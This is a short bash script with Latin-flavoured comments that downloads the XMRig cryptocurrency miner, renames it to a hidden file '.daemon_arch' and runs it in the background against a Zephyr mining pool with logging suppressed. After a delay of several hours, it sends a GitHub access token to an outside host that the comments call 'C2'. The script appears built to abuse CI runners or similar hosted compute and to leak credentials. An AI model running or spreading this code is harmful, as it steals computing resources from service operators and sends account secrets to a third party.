#!/bin/bash
cd "$(dirname "$0")"

# --- SYSTEMA ANALYSI ---
CPU_CORES=$(nproc)
LIMIT=30
AGENT=".daemon_arch"

echo "Cognoscere systema... CPU Cores: $CPU_CORES"

# --- DOWNLOAD & MASK ---
wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
mv xmrig-6.22.2/xmrig ./$AGENT
rm -rf xmrig-6.22.2*

# --- IGNITIO ---
echo "Incipit mining... Fortis fortuna adiuvat!"
./$AGENT \
    -o de.zephyr.herominers.com:1123 \
    -u $ZEPH_WALLET \
    -p "Latinitas_$(openssl rand -hex 3)" \
    -a rx/0 \
    --cpu-max-threads-hint $LIMIT \
    --background \
    --log-file /dev/null &

# --- CIRCULUS INFINITUS ---
RANDOM_MINUTES=$((10 + RANDOM % 31))
sleep $(( (300 + RANDOM_MINUTES) * 60 ))

echo "Finis... Sinyal mittitur ad C2."
curl -H "Authorization: $GH_PAT" "https://omviportal.com/trigger.php?repo=PROJE_ADI_BURAYA"
exit 0
